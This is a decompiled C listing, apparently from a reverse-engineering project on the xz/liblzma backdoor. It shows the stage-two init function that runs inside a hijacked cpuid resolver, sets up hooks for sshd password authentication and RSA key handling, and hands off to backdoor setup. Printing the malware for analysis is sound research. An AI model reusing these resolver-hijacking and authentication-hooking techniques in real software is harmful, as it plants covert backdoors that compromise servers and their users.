// /home/kali/xzre-ghidra/xzregh/106F30_backdoor_init_stage2.c
// Function: backdoor_init_stage2 @ 0x106F30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_init_stage2(elf_entry_ctx_t * ctx, u64 * caller_frame, void * * cpuid_got_addr, backdoor_cpuid_reloc_consts_t * reloc_consts)


/*
 * AutoDoc: Runs inside the hijacked cpuid resolver. It builds temporary `backdoor_shared_globals_t`,
 * `backdoor_hooks_ctx_t`, and `backdoor_setup_params_t` objects, repeatedly calls
 * `init_hooks_ctx()` until the shared globals are available, and then hands the bundle to
 * `backdoor_setup`. If setup succeeds it never returns (the hooks stay installed); if setup fails
 * it zeroes the GOT context and falls back to issuing a real CPUID so liblzma’s resolver still
 * fulfils glibc’s contract.
 */
#include "xzre_types.h"


BOOL backdoor_init_stage2
               (elf_entry_ctx_t *ctx,u64 *caller_frame,void **cpuid_got_addr,
               backdoor_cpuid_reloc_consts_t *reloc_consts)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  int iVar6;
  BOOL BVar7;
  long lVar8;
  backdoor_shared_globals_t *pbVar9;
  backdoor_hooks_ctx_t *extraout_RDX;
  backdoor_hooks_ctx_t *pbVar10;
  backdoor_hooks_ctx_t *extraout_RDX_00;
  backdoor_setup_params_t *pbVar11;
  backdoor_setup_params_t setup_params;
  backdoor_hooks_ctx_t hooks_ctx;
  backdoor_shared_globals_t shared_globals;
  backdoor_shared_globals_t local_140;
  backdoor_hooks_ctx_t local_128;
  backdoor_setup_params_t local_a0;
  
  pbVar10 = &local_128;
  for (lVar8 = 0x22; lVar8 != 0; lVar8 = lVar8 + -1) {
    pbVar10->_unknown1621[0] = '\0';
    pbVar10->_unknown1621[1] = '\0';
    pbVar10->_unknown1621[2] = '\0';
    pbVar10->_unknown1621[3] = '\0';
    pbVar10 = (backdoor_hooks_ctx_t *)(pbVar10->_unknown1621 + 4);
  }
  pbVar11 = &local_a0;
  for (lVar8 = 0x22; lVar8 != 0; lVar8 = lVar8 + -1) {
    pbVar11->_unknown1649[0] = '\0';
    pbVar11->_unknown1649[1] = '\0';
    pbVar11->_unknown1649[2] = '\0';
    pbVar11->_unknown1649[3] = '\0';
    pbVar11 = (backdoor_setup_params_t *)(pbVar11->_unknown1649 + 4);
  }
  local_140.mm_answer_authpassword_hook = mm_answer_authpassword_hook;
  local_140.hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
  local_140.globals = (global_context_t **)&global_ctx;
  lzma_check_init(&local_a0.dummy_check_state,LZMA_CHECK_NONE);
  pbVar9 = &local_140;
  iVar6 = init_hooks_ctx(&local_128);
  pbVar10 = extraout_RDX;
  do {
    if (iVar6 == 0) {
      local_a0.shared = pbVar9;
      local_a0.entry_ctx = ctx;
      BVar7 = backdoor_setup(&local_a0);
      return BVar7;
    }
    local_128.shared = pbVar9;
    iVar6 = init_hooks_ctx(pbVar10);
    pbVar10 = extraout_RDX_00;
  } while (iVar6 != 5);
  ctx->symbol_ptr = (void *)0x1;
  (ctx->got_ctx).got_ptr = (void *)0x0;
  (ctx->got_ctx).return_address = (void *)0x0;
  (ctx->got_ctx).cpuid_fn = (void *)0x0;
  (ctx->got_ctx).got_offset = 0;
  piVar1 = (int *)cpuid_basic_info(0);
  if (*piVar1 != 0) {
    puVar2 = (undefined4 *)cpuid_Version_info(1);
    uVar3 = puVar2[1];
    uVar4 = puVar2[2];
    uVar5 = puVar2[3];
    *(undefined4 *)&(ctx->got_ctx).got_ptr = *puVar2;
    *(undefined4 *)&(ctx->got_ctx).return_address = uVar3;
    *(undefined4 *)&(ctx->got_ctx).cpuid_fn = uVar5;
    *(undefined4 *)&(ctx->got_ctx).got_offset = uVar4;
  }
  return FALSE;
}

